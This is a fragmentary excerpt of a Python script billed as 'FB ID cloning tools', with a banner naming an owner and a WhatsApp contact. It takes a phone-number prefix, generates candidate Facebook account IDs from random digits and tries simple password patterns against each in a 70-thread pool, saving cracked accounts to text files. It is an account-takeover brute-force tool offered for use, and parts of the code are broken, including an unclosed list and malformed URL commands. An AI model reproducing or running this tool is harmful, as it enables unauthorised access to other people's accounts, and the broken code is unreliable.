...
logo=("""
  ...
  ─────────────────────────────────────────────────
 WELCOME TO FB ID CLONING TOOLS
  ─────────────────────────────────────────────────    
\33[1;37m----------------------------------------------
→   Owner : EVAN AHAMED RAKIB 
→  Facebook : EVAN AHAMED RAKIB 
→Whatsapp : +01734308267
→   Tools       :  FILE X RANDOM 
...
def riaz():
	...
	if riaz1 =='4':
		os.system('xdg-open')
	if riaz1 =='3':
		os.system('xdg-openhttps:https://www.facebook.com/profile.php?id=100000544155541');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 0171,0191,018,****Etc')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'first6','last6','first8','last8',']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN ASHE.txt : ASHES..txt')
    print(46*'-')
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 0171,0181,0191****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            ...
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN ASHES.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete🎋🎋🎋')
    print('Press Enter to Back');riaz()
def m3():
